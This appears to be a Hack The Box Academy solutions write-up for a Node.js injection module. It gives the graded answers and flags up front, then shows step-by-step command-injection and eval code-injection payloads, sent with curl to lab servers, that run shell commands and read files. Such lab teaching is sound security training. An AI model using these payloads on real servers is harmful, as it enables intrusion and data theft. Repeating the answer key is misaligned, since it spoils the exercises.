
| Section                       | Question Number | Answer                                                                                                             |
| ----------------------------- | --------------- | ------------------------------------------------------------------------------------------------------------------ |
| Obtaining the code            | Question 1      | b7fbe5082d3d3929bf8df693bae824d2                                                                                   |
| Syntax Errors                 | Question 1      | HTB{n3v3r\_3x3cu73\_u53r\_1npu7}                                                                                   |
| POST Requests                 | Question 1      | SyntaxError: Unexpected end of JSON input                                                                          |
| Controlling the Eval Function | Question 1      | const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("this is just a test!").digest("hex"); |
| Code Injection                | Question 1      | HTB{c0d3\_1nj3c710n\_l34d5\_70\_c0mm4nd\_1nj3c710n!}                                                               |
| Remote Code Execution         | Question 1      | HTB{n3v3r\_7ru57\_u53r\_1npu7}                                                                                     |
| Skills Assessment             | Question 1      | HTB{c0mm4nd\_1nj3c710n\_n1nj4}                                                                                     |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Obtaining the code: A NodeJS Server

## Question 1

### "Within the validateKey function lies a secret hash. What is its value?"

After spawning the target machine, students need to download the file (providing the password `unSqyU7wQc7uFRBV` when prompted for it):

Code: shell

```shell
wget http://STMIP:STMPO/093863aaef36aa270f95e8e5c3cc9fa5/nodejs-server-sourcecode.zip
unzip nodejs-server-sourcecode.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget 167.172.63.87:32156/093863aaef36aa270f95e8e5c3cc9fa5/nodejs-server-sourcecode.zip

--2022-09-28 07:26:53--  http://167.172.63.87:32156/093863aaef36aa270f95e8e5c3cc9fa5/nodejs-server-sourcecode.zip
Connecting to 167.172.63.87:32156... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3083 (3.0K) [application/zip]
Saving to: ‘nodejs-server-sourcecode.zip’

nodejs-server-sour 100%[=============>]   3.01K  --.-KB/s    in 0s      

2022-09-28 07:26:53 (295 MB/s) - ‘nodejs-server-sourcecode.zip’ saved [3083/3083]
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip nodejs-server-sourcecode.zip

Archive:  nodejs-server-sourcecode.zip
[nodejs-server-sourcecode.zip] admin.html password: 
  inflating: admin.html              
  inflating: denied.html             
  inflating: server.js               
  inflating: validateKey.js 
```

Then, when analyzing `validateKey.js`, students will realize that it is obfuscated, thus, they need to paste the code in [Prettier](https://prettier.io/) and notice that on line 96, there is a comparison:

![[HTB Solutions/Others/z. images/39539a64f467359cb8c95b1e91c4817d_MD5.jpg]]

Code: javascript

```javascript
if (keyHash == _0x1415("0xd") + _0x1415("0x0") + _0x1415("0xa") + "d2")
      return !![];
```

Therefore, students need to use `console.log()` on the values that `keyHash` is being compared to, attaining the secret hash `b7fbe5082d3d3929bf8df693bae824d2`:

Code: javascript

```javascript
console.log(_0x1415("0xd") + _0x1415("0x0") + _0x1415("0xa") + "d2");
```

![[HTB Solutions/Others/z. images/06f4c8ac7ee00a0e3deeab361a0649b0_MD5.jpg]]

Code: javascript

```javascript
console.log(_0x1415("0xd") + _0x1415("0x0") + _0x1415("0xa") + "d2");

b7fbe5082d3d3929bf8df693bae824d2
```

Answer: `b7fbe5082d3d3929bf8df693bae824d2`

# Syntax Errors

## Question 1

### "What is the content of the flag?"

After spawning the target system, students need to perform basic command injection. After the `ip` URL parameter, students need to add the loopback address `127.0.0.1` so that the command executes successfully:

Code: shell

```shell
curl -w "\n" -s 'http://STMIP:STMPO/ping?ip=127.0.0.1'
```

```
┌─[us-academy-2]─[10.10.14.94]─[htb-ac413848@htb-sngtigpkku]─[~]
└──╼ [★]$ curl -w "\n" -s 'http://167.99.89.94:30859/ping?ip=127.0.0.1'

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms
```

Then, to inject commands, students need to add the double quotes `"` to escape the quotes, add a semi-colon `;` and students will be able to execute any command. However, to avoid causing errors that may prevent getting the correct output, students need to end the command with a semi-colon `;` and comment out the rest of the line with `#`. At last, students need to make sure that the payload has balanced quotes to avoid causing errors, thus, they need to add a double quotes `"` at the end, and then URL encode the entire payload:

Code: shell

```shell
curl 'http://STMIP:STMPO/ping?ip=127.0.0.1%22;%20cat%20flag.txt;%20%23"'
```

```
┌─[us-academy-2]─[10.10.14.94]─[htb-ac413848@htb-sngtigpkku]─[~]
└──╼ [★]$ curl 'http://167.99.89.94:30859/ping?ip=127.0.0.1%22;%20cat%20flag.txt;%20%23"'

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms

HTB{n3v3r_3x3cu73_u53r_1npu7}
```

Answer: `HTB{n3v3r_3x3cu73_u53r_1npu7}`

# POST Requests

## Question 1

### "After sending the last POST request we discussed, you will get a 'SyntaxError'. What is the content of this error?"

Using the same `nodejs-server-sourcecode.zip` file downloaded from the first section, students need to unzip (utilizing the password `unSqyU7wQc7uFRBV` when prompted for it) it and then run `server.js`:

Code: shell

```shell
unzip -qq nodejs-server-sourcecode.zip && node server.js
```

```
┌─[us-academy-2]─[10.10.14.94]─[htb-ac413848@htb-sngtigpkku]─[~]
└──╼ [★]$ unzip -qq nodejs-server-sourcecode.zip && node server.js
[nodejs-server-sourcecode.zip] admin.html password:

Server is running on http://0.0.0.0:21440
```

In another tab, students need to send an empty `POST` request to the `/admin` endpoint using `curl`, to notice the error message `SyntaxError: Unexpected end of JSON input` in the node server log:

Code: shell

```shell
curl http://127.0.0.1:21440/admin -X POST
```

```
┌─[us-academy-2]─[10.10.14.94]─[htb-ac413848@htb-sngtigpkku]─[~]
└──╼ [★]$ curl http://127.0.0.1:21440/admin -X POST

<!DOCTYPE html>

<head>

<SNIP>
```

```
Server is running on http://0.0.0.0:21440
SyntaxError: Unexpected end of JSON input
    at JSON.parse (<anonymous>)
    at validateKey (/home/htb-ac413848/validateKey.js:1:1866)
    at IncomingMessage.<anonymous> (/home/htb-ac413848/server.js:48:21)
    at IncomingMessage.emit (events.js:314:20)
    at endReadableNT (_stream_readable.js:1241:12)
    at processTicksAndRejections (internal/process/task_queues.js:84:21)
```

Answer: `SyntaxError: Unexpected end of JSON input`

# Controlling the Eval Function

## Question 1

### "After sending our last 'curl' command, you should the content of the 'eval' function printed, along with our input. What is the line printed?"

Using the same `nodejs-server-sourcecode.zip` file downloaded from the first section, students need to copy the contents of `validateKey.js` into [Prettier](https://prettier.io/playground/):

![[HTB Solutions/Others/z. images/3c01c9972bcadb7e9771cfb6cc3e0b73_MD5.jpg]]

Code: javascript

```javascript
var _0x1d4c = [
  "lMnYzwf0zuHHCW==",
  "m2qZoti5yMy4za==",
  "CgrHDguOiG==",
  "iIKUzgLNzxn0ka==",
  "Bg9N",
  "iIK7igTLEuHHCW==",
  "AcGIBwq1iIKUDq==",
  "Dg8GpsbYzxf1Aq==",
  "A2v5",
  "iMHLEciPoW==",
  "Aca9ignYExb0BW==",
  "zJy5m2jHztGYna==",
  "CgfYC2u=",
  "y29UC3qGy3j5Ca==",
  "yJDMyMu1mdGYza==",
  "CMuOiMnYExb0BW==",
];
(function (_0x402392, _0x1d4c31) {
  var _0x1415fc = function (_0x2a4f25) {
    while (--_0x2a4f25) {
      _0x402392["push"](_0x402392["shift"]());
    }
  };
  _0x1415fc(++_0x1d4c31);
})(_0x1d4c, 0x171);
var _0x1415 = function (_0x402392, _0x1d4c31) {
  _0x402392 = _0x402392 - 0x0;
  var _0x1415fc = _0x1d4c[_0x402392];
  if (_0x1415["hRcFXf"] === undefined) {
    var _0x2a4f25 = function (_0x31142e) {
      var _0x2e12d0 =
          "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=",
        _0x54b6b9 = String(_0x31142e)["replace"](/=+$/, "");
      var _0x4a7cb8 = "";
      for (
        var _0x4126fb = 0x0, _0xcb88e4, _0x4544bd, _0x4ebfac = 0x0;
        (_0x4544bd = _0x54b6b9["charAt"](_0x4ebfac++));
        ~_0x4544bd &&
        ((_0xcb88e4 =
          _0x4126fb % 0x4 ? _0xcb88e4 * 0x40 + _0x4544bd : _0x4544bd),
        _0x4126fb++ % 0x4)
          ? (_0x4a7cb8 += String["fromCharCode"](
              0xff & (_0xcb88e4 >> ((-0x2 * _0x4126fb) & 0x6))
            ))
          : 0x0
      ) {
        _0x4544bd = _0x2e12d0["indexOf"](_0x4544bd);
      }
      return _0x4a7cb8;
    };
    (_0x1415["Ncsfcg"] = function (_0x3dcea9) {
      var _0x2d8521 = _0x2a4f25(_0x3dcea9);
      var _0x2d077c = [];
      for (
        var _0xb1e023 = 0x0, _0x2b407d = _0x2d8521["length"];
        _0xb1e023 < _0x2b407d;
        _0xb1e023++
      ) {
        _0x2d077c +=
          "%" +
          ("00" + _0x2d8521["charCodeAt"](_0xb1e023)["toString"](0x10))[
            "slice"
          ](-0x2);
      }
      return decodeURIComponent(_0x2d077c);
    }),
      (_0x1415["jhBfJA"] = {}),
      (_0x1415["hRcFXf"] = !![]);
  }
  var _0x3fb401 = _0x1415["jhBfJA"][_0x402392];
  return (
    _0x3fb401 === undefined
      ? ((_0x1415fc = _0x1415["Ncsfcg"](_0x1415fc)),
        (_0x1415["jhBfJA"][_0x402392] = _0x1415fc))
      : (_0x1415fc = _0x3fb401),
    _0x1415fc
  );
};
function validateKey(input) {
  try {
    json = JSON[_0x1415("0xb")](input);
    var keyHash;
    eval(
      _0x1415("0xc") +
        _0x1415("0x6") +
        _0x1415("0xe") +
        _0x1415("0x4") +
        _0x1415("0x9") +
        _0x1415("0xf") +
        _0x1415("0x5") +
        _0x1415("0x1") +
        json[_0x1415("0x7")] +
        (_0x1415("0x2") + _0x1415("0x8"))
    );
    if (keyHash == _0x1415("0xd") + _0x1415("0x0") + _0x1415("0xa") + "d2")
      return !![];
  } catch (_0x2fa439) {
    return console[_0x1415("0x3")](_0x2fa439), ![];
  }
  return ![];
}

exports.validateKey = validateKey;
```

On line 245, students need to edit the `validateKey.js` file and change the `eval` function into `console.log` instead:

Code: javascript

```javascript
  try {
    json = JSON[_0x1415("0xb")](input);
    var keyHash;
    console.log(
      _0x1415("0xc") +
        _0x1415("0x6") +
        _0x1415("0xe") +
        _0x1415("0x4") +
        _0x1415("0x9") +
        _0x1415("0xf") +
        _0x1415("0x5") +
        _0x1415("0x1") +
        json[_0x1415("0x7")] +
        (_0x1415("0x2") + _0x1415("0x8"))
    );
    if (keyHash == _0x1415("0xd") + _0x1415("0x0") + _0x1415("0xa") + "d2")
      return !![];
  } catch (_0x2fa439) {
    return console[_0x1415("0x3")](_0x2fa439), ![];
  }
```

Students need to stop and start again `server.js`. After analyzing `server.js`, students will know that in order to reach the `validateKey` function, they need to:

- Access `/admin`
- Send a POST request
- Have JSON data

Code: javascript

```javascript
<SNIP>

else if (req.url == '/admin') {
        if (req.method == 'POST') {
            var body = '';
            req.on('data', function (data) {
                body += data;
            })
            req.on('end', function () {
                if (validateKey(body)) {
                    adminPage(res);
                }
                else {
                    deniedPage(res);
                }
            })
        }
        else {
            deniedPage(res);
        }

<SNIP>
```

Therefore, in a tab other than the one with `server.js` running, students need to send a `POST` request with any JSON data to the `/admin` endpoint so that the `validateKey` function is executed, to notice the string `const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("this is just a test!").digest("hex");` printed in the node server logs:

Code: shell

```shell
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"this is just a test!"}'
```

```
┌─[us-academy-2]─[10.10.14.94]─[htb-ac413848@htb-sngtigpkku]─[~]
└──╼ [★]$ curl http://127.0.0.1:21440/admin -X POST -d '{"key":"this is just a test!"}'

<!DOCTYPE html>

<head>
```

```
┌─[us-academy-2]─[10.10.14.94]─[htb-ac413848@htb-sngtigpkku]─[~]
└──╼ [★]$ node server.js 

Server is running on http://0.0.0.0:21440
const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("this is just a test!").digest("hex");
```

Answer: `const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("this is just a test!").digest("hex");`

# Code Injection

## Question 1

### "Try to inject a NodeJS code on the remote server to read the 'flag.txt' file in the same directory, and write its content into the 'denied.html' file, which you can access. What is the content of the flag?"

Students need to have `server.js` running locally to test payloads for this question. From the previous question, students had the line `const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("this is just a test!").digest("hex");` printed out, this, the the string within the `update` function can be controlled using the `key` variable in the JSON data that is sent, therefore, any JavaScript code injected into the `update` keyword will be executed by `NodeJS`. To inject code, students first need to escape the quotes by injecting `"`, then end with `);` and then write any JavaScript code, such as `console.log("injected")`. However, students need to comment out the rest of the code so it does not produce any subsequent issues by adding `//` at the end of the payload, `"); console.log("injected");//`. However, before sending the payload, students need to escape any quotes to avoid causing issues with JSON, using `jq`:

Code: shell

```shell
echo '"); console.log("injected");//' | jq -aR .
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-hz24gns7ly]─[~]
└──╼ [★]$ echo '"); console.log("injected");//' | jq -aR .

"\"); console.log(\"injected\");//"
```

At last, students need to test the payload by sending it to the `server.js` running locally:

Code: shell

```shell
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"\"); console.log(\"successful injection\"); //"}'
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-hz24gns7ly]─[~]
└──╼ [★]$ curl http://127.0.0.1:21440/admin -X POST -d '{"key":"\"); console.log(\"successful injection\"); //"}'

<!DOCTYPE html>

<SNIP>
```

Checking the Node `server.js` logs will show the string "successful injection" printed:

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-hz24gns7ly]─[~]
└──╼ [★]$ unzip -qq nodejs-server-sourcecode.zip && node server.js
[nodejs-server-sourcecode.zip] admin.html password: 

Server is running on http://0.0.0.0:21440
successful injection
```

Now that students know the payload is functional, they need to inject JavaScript code to read the flag file `flag.txt` and write it into `denied.html`; to do so, students need to write JavaScript code that will read the flag and writes it into another file in a single line to fit a JSON payload; one example to do so is:

Code: javascript

```javascript
var fs = require("fs"); fs.readFile("flag.txt", function(err, data) {fs.writeFile("denied.html", data, function (err) {if (err) throw err;});})
```

Students need to add `");` at the beginning of the payload and `//` at the end as done to the previous payload:

Code: javascript

```javascript
"); var fs = require("fs"); fs.readFile("flag.txt", function(err, data) {fs.writeFile("denied.html", data, function (err) {if (err) throw err;});});//
```

To test this code/payload, students need to write it inside a file (named `testingPayload.js` in here) and run it with `node testingPayload.js`, to notice that whatever was specified in `fs.readFile` will be written to the file name specified in `fs.writeFile` (students can change "flag.txt" to `/etc/passwd` for example when testing, otherwise, they can create a file named "flag.txt" and make it have some data).

Now, instead of students injecting `console.log`, they need to inject the reading and writing files payload (shown above), making sure that they escape all quotes with `jq` as performed for the previous payload:

Code: shell

```shell
echo '"); var fs = require("fs"); fs.readFile("flag.txt", function(err, data) {fs.writeFile("denied.html", data, function (err) {if (err) throw err;});});//' | jq -aR .
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-hz24gns7ly]─[~]
└──╼ [★]$ echo '"); var fs = require("fs"); fs.readFile("flag.txt", function(err, data) {fs.writeFile("denied.html", data, function (err) {if (err) throw err;});});//' | jq -aR .

"\"); var fs = require(\"fs\"); fs.readFile(\"flag.txt\", function(err, data) {fs.writeFile(\"denied.html\", data, function (err) {if (err) throw err;});});//"
```

Subsequently, students need to send the payload to the spawned target machine as the value for the `key` JSON variable:

Code: shell

```shell
curl http://STMIP:STMPO/admin -X POST -d '{"key":"\"); var fs = require(\"fs\"); fs.readFile(\"flag.txt\", function(err, data) {fs.writeFile(\"denied.html\", data, function (err) {if (err) throw err;});});//"'}
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-hz24gns7ly]─[~]
└──╼ [★]$ curl http://159.65.63.151:30161/admin -X POST -d '{"key":"\"); var fs = require(\"fs\"); fs.readFile(\"flag.txt\", function(err, data) {fs.writeFile(\"denied.html\", data, function (err) {if (err) throw err;});});//"'}
```

At last, students need to send a request to the `/admin` endpoint using `cURL` to attain the flag `HTB{c0d3_1nj3c710n_l34d5_70_c0mm4nd_1nj3c710n!}`:

Code: shell

```shell
curl http://STMIP:STMPO/admin
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-hz24gns7ly]─[~]
└──╼ [★]$ curl http://159.65.63.151:30161/admin

HTB{c0d3_1nj3c710n_l34d5_70_c0mm4nd_1nj3c710n!}
```

Answer: `HTB{c0d3_1nj3c710n_l34d5_70_c0mm4nd_1nj3c710n!}`

# Exploitation: Remote Code Execution

## Question 1

### "Try to replicate what you learned in this section to find 'flag.txt' and get its content. What is the content of the flag?"

From the previous question, students need to use the same command injection payload and steps, however, instead of reading and writing files, they need execute commands on the backend server and to write the content of the flag file "flag.txt" into the file `/var/www/html/denied.html`:

Code: javascript

```javascript
const { exec } = require("child_process"); exec("cat /flag.txt > /var/www/html/denied.html");
```

As done previously, students need to add `");` at the beginning of the payload and `//` at the end of it and then escape all quotes using `jq`:

Code: javascript

```javascript
"); const { exec } = require("child_process"); exec("cat /flag.txt > /var/www/html/denied.html");//
```

Code: shell

```shell
echo '"); const { exec } = require("child_process"); exec("cat /flag.txt > /var/www/html/denied.html");//' | jq -aR .
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-mbugtfaub2]─[~]
└──╼ [★]$ echo '"); const { exec } = require("child_process"); exec("cat /flag.txt > /var/www/html/denied.html");//' | jq -aR .

"\"); const { exec } = require(\"child_process\"); exec(\"cat /flag.txt > /var/www/html/denied.html\");//"
```

Then, students need to send the payload to the spawned target machine as the value for the `key` JSON variable:

Code: shell

```shell
curl http://STMIP:STMPO/admin -X POST -d '{"key":"\"); const { exec } = require(\"child_process\"); exec(\"cat /flag.txt > /var/www/html/denied.html\");//"'}
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-ozpobfo5uw]─[~]
└──╼ [★]$ curl http://167.71.141.57:32536/admin -X POST -d '{"key":"\"); const { exec } = require(\"child_process\"); exec(\"cat /flag.txt > /var/www/html/denied.html\");//"'}
<!DOCTYPE html>

<head>
    <title>Admin Dashboard</title>
<SNIP>
```

At last, students need to send a request to the `/admin` endpoint using `cURL` to attain the flag `HTB{n3v3r_7ru57_u53r_1npu7}`:

Code: shell

```shell
curl http://STMIP:STMPO/admin
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-mbugtfaub2]─[~]
└──╼ [★]$ curl http://138.68.181.31:30742/admin

HTB{n3v3r_7ru57_u53r_1npu7}
```

Answer: `HTB{n3v3r_7ru57_u53r_1npu7}`

# Skills Assessment

## Question 1

### "Once you gain a foothold on the server, you should be able to find a flag, which you can submit here."

After spawning the target machine, students need to download "source.zip" and then unzip it:

Code: shell

```shell
wget http://STMIP:STMPO/source.zip && unzip source.zip
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-ozpobfo5uw]─[~]
└──╼ [★]$ wget http://178.62.88.144:30549/source.zip && unzip source.zip

--2022-12-20 08:22:58--  http://178.62.88.144:30549/source.zip
Connecting to 178.62.88.144:30549... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2442053 (2.3M) [application/zip]
Saving to: ‘source.zip’

source.zip         100%[=============>]   2.33M  --.-KB/s    in 0.009s  

2022-12-20 08:22:58 (269 MB/s) - ‘source.zip’ saved [2442053/2442053]

Archive:  source.zip

   creating: css/
  inflating: css/style.css           
  inflating: server.js
<SNIP>
```

Subsequently, students need to run "server.js" locally then access it on `http://127.0.0.1:21440/`:

Code: shell

```shell
node server.js
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-ozpobfo5uw]─[~]
└──╼ [★]$ node server.js

Server is running on http://0.0.0.0:21440
```

![[HTB Solutions/Others/z. images/5bdd7e7e6f873a1c09a829b088455471_MD5.jpg]]

Students will notice that there are four buttons named "whoami", "hostname", "ifconfig", and "ping" and when inspecting "server.js", there is an endpoint for each button, respectively. "whoami" is a POST endpoint that does not accept any user input, therefore, there is no injection point:

Code: javascript

```javascript
app.post('/whoami', function (req, res) {
    try {
        child_process.exec(
            'whoami',
            function (error, stdout) {
                if (error) {
                    console.log('error: ', error);
                }
                res.render("index", { response: stdout });
                res.end();
            });
    }
    catch (e) {
        res.render("index", { response: 'something went wrong!' });
        res.end();
    }
})
```

"hostname" is also a POST endpoint and does not accept any user input, regardless of its usage of the dangerous function `eval`, therefore, there is no point of injection here:

Code: javascript

```javascript
app.post('/hostname', function (req, res) {
    try {
        eval('child_process.exec("hostname",function (error, stdout) {res.render("index", { response: stdout });});');
    }
    catch (e) {
        res.render("index", { response: 'something went wrong!' });
        res.end();
    }
})
```

"ifconfig" is also a POST endpoint however it does accept user input with the POST parameter named "iface", but regardless, it is used safely to the system command `ifconfig`, as if it is not null, it will be assigned the option `-a`, therefore, there is no point of injection here:

Code: javascript

```javascript
app.post('/ifconfig', function (req, res) {
    try {
        child_process.execFile(
            'ifconfig',
            [(req.body.iface != null) ? req.body.iface : '-a'],
            function (error, stdout) {
                res.render("index", { response: stdout });
                res.end();
            });
    }
    catch (e) {
        res.render("index", { response: 'something went wrong!' });
        res.end();
    }
})
```

At last, "ping" is also a POST endpoint and accepts user input via the POST parameters "debug" and "ip"; if "debug" is set to `true`, "ip" is not null, and "eval(\`ip = JSON.parse('${req.body.ip}').ip;\`) !== "undefined")" evaluates to `true`, then the "ip" parameter will be used as an argument to the system command `ping`:

Code: javascript

```javascript
app.post('/ping', function (req, res) {
    try {
        child_process.execFile(
            'ping',
            ['-c 1',
                (req.body.debug == 'true') ?
                    ((req.body.ip != null) && eval(\`ip = JSON.parse('${req.body.ip}').ip;\`) !== "undefined") ?
                        ip : '127.0.0.1' : '127.0.0.1'],
            function (error, stdout) {
                res.render("index", { response: stdout });
                res.end();
            });
    }
    catch (e) {
        res.render("index", { response: 'something went wrong!' });
        res.end();
    }
})
```

However, this also safely used as the resultant command will be `('ping', ['-c 1','ip'])`. The final point of injection is where the "ip" POST parameter is inputted directly without any sanitization, because "ip = JSON.parse(\`req.body.ip\`)" is checking if the POST parameter "ip" is a JSON object and has a key named "ip", which if exists will assign its value as the "ip" used as the argument for the `ping` system command. Thus, since `${req.body.ip}` is directly inputted into `eval` without any sanitization nor filtering, it will be the injection point. To inject commands into `eval`, students need to satisfy the four conditions:

- Sending a POST request to the `/ping` endpoint
- Setting the "debug" POST parameter to `true`
- Setting the "ip" POST parameter to a JSON object, with the key named "ip"
- Inject commands in the value of the "ip" key, as in `{"ip":INJECTION}`

First, students need to test on the local server running, adding `console.log()` for each step to assure the payload is functional. To inject code into `eval`, students need to follow the code injection steps taught in the module:

1. Code injection will be in: `ip = JSON.parse('INJECTION').ip;`, thus, students need to close `'` and `)`, such that it the JSON object becomes `{"ip":"127.0.0.1'); console.log("INJECTED");"`
2. Then, the resultant command when fed to the server will have a syntax error:

Code: javascript

```javascript
ip = JSON.parse('127.0.0.1'); console.log('INJECTED');').ip;
```

Therefore, students need not break JSON and comment out `').ip`:

Code: javascript

```javascript
ip = JSON.parse('127.0.0.1').ip; console.log('INJECTED');//'\).ip;
```

3. The final JSON has a syntax error due to the command:

Code: json

```json
{"ip": "127.0.0.1').ip; console.log('INJECTED');//').ip;"}
```

Thus, students need to properly close it to send a proper `ip` value:

Code: json

```json
{"ip": "127.0.0.1"}').ip; console.log('INJECTED');//').ip;"}
```

4. The payload thus far is `127.0.0.1"}').ip; console.log('INJECTED');//').ip;`, thus, students need to escape any quotes to avoid causing issues with JSON, using `jq`:

Code: shell

```shell
cat << EOF > payload
127.0.0.1"}').ip; console.log('INJECTED');//').ip;
EOF
cat payload | jq -aR
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ cat << EOF > payload
127.0.0.1"}').ip; console.log('INJECTED');//').ip;
EOF
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ cat payload | jq -aR

"127.0.0.1\"}').ip; console.log('INJECTED');//').ip;"
```

The payload becomes `"127.0.0.1\"}').ip; console.log('INJECTED');//').ip;"` which students need to test on the local server running on port 21440 with `cURL`, escaping single quotes by URL-encoding them:

Code: shell

```shell
curl http://127.0.0.1:21440/ping -X POST -d 'debug=true&ip={"ip":"127.0.0.1\"}%27).ip; console.log(%27INJECTED%27);//%27).ip;"}'
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ curl http://127.0.0.1:21440/ping -X POST -d 'debug=true&ip={"ip":"127.0.0.1\"}%27).ip; console.log(%27INJECTED%27);//%27).ip;"}'

<!DOCTYPE html><head><meta charset="UTF-8"><title>Basic Linux Commands</title><link rel="stylesheet" href="./style.css"></head>
<SNIP>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.036 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms
```

When checking the server logs, students will find the string "INJECTED" printed, confirming successful code injection:

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ node server.js 
Server is running on http://0.0.0.0:21440

INJECTED
```

To execute commands and write a file to the system instead of printing a string, students can use `touch`:

Code: js

```js
const { exec } = require('child_process'); exec('touch INJECTED');
```

However, students need to escape single quotes by URL-encoding them:

Code: javascript

```javascript
const { exec } = require(%27child_process%27); exec(%27touch INJECTED%27);
```

After sending the new payload with `cURL`, students will notice that a new file named "INJECTED" has been created in the current directory:

Code: shell

```shell
curl http://127.0.0.1:21440/ping -X POST -d 'debug=true&ip={"ip":"127.0.0.1\"}%27).ip; const { exec } = require(%27child_process%27); exec(%27touch INJECTED%27);//%27).ip;"}'
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ curl http://127.0.0.1:21440/ping -X POST -d 'debug=true&ip={"ip":"127.0.0.1\"}%27).ip; const { exec } = require(%27child_process%27); exec(%27touch INJECTED%27);//%27).ip;"}'

<!DOCTYPE html><head><meta charset="UTF-8"><title>Basic Linux Commands</title><link rel="stylesheet" href="./style.css"></head>
<SNIP>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
</code></pre>
```

Code: shell

```shell
ls | grep "INJ.*"
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ ls | grep "INJ.*"

INJECTED
```

Subsequently, students need to find a public file/directory where they can direct output, and after fuzzing, students will find out that the `css` directory is publicly accessible, thus, a file named "out.txt" will be created on the spawned target under the directory `/css/` with the contents of it using the `ls` command:

Code: shell

```shell
curl http://STMIP:STMPO/ping -X POST -d 'debug=true&ip={"ip":"127.0.0.1\"}%27).ip; const { exec } = require(%27child_process%27); exec(%27ls -la ./> css/out.txt%27);//%27).ip;"}'
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ curl http://178.62.88.144:30120/ping -X POST -d 'debug=true&ip={"ip":"127.0.0.1\"}%27).ip; const { exec } = require(%27child_process%27); exec(%27ls -la ./> css/out.txt%27);//%27).ip;"}'

<!DOCTYPE html><head><meta charset="UTF-8"><title>Basic Linux Commands</title><link rel="stylesheet" href="./style.css"></head>
<SNIP>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.013/0.013/0.013/0.000 ms
```

Then, when checking the contents of "out.txt", students will find the flag file named "flag.txt":

Code: shell

```shell
curl http://STMIP:STMPO/out.txt
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ curl http://178.62.88.144:30120/out.txt

total 2464
drwxr-xr-x 1 www-data www-data    4096 Oct  5  2020 .
drwxr-xr-x 1 root     root        4096 Aug 19  2020 ..
drwxr-xr-x 1 www-data www-data    4096 Dec 20 15:13 css
-rw-r--r-- 1 www-data www-data      29 Oct  5  2020 flags.txt
-rw-r--r-- 1 www-data www-data   10918 Aug 19  2020 index.html
drwxr-xr-x 1 www-data www-data    4096 Oct  5  2020 node_modules
-rw-r--r-- 1 www-data www-data   25373 Oct  5  2020 package-lock.json
-rw-r--r-- 1 www-data www-data    2420 Oct  4  2020 server.js
-rw-r--r-- 1 www-data www-data 2442053 Oct  5  2020 source.zip
drwxr-xr-x 1 www-data www-data    4096 Oct  4  2020 views
```

